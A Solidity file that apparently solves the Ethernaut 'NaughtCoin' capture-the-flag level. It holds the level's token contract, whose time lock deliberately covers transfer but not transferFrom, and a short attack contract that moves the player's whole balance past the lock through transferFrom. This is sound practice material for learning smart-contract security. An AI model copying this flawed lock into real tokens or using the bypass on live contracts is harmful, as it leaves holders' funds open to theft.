// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol"; // 

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool success) {
        success = super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

interface INaughtCoin {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
// amount = (await contract.balanceOf(player)).toString()
// before deploying contract give approve to instance/helper address by `await contract.approve(helper, amount)`  
contract NaughtCoinAttack{
    INaughtCoin naughtCoin;

    constructor(address naughtCoinAddress){
        naughtCoin = INaughtCoin(naughtCoinAddress);
    }

// see the timelock modifier only applicable for transfer function but not transferFrom
    function attack(address _target) external {
        uint256 amount = naughtCoin.balanceOf(msg.sender);
        require(amount > 0, "No tokens to steal");
        naughtCoin.transferFrom(msg.sender, _target,amount);
    }


}
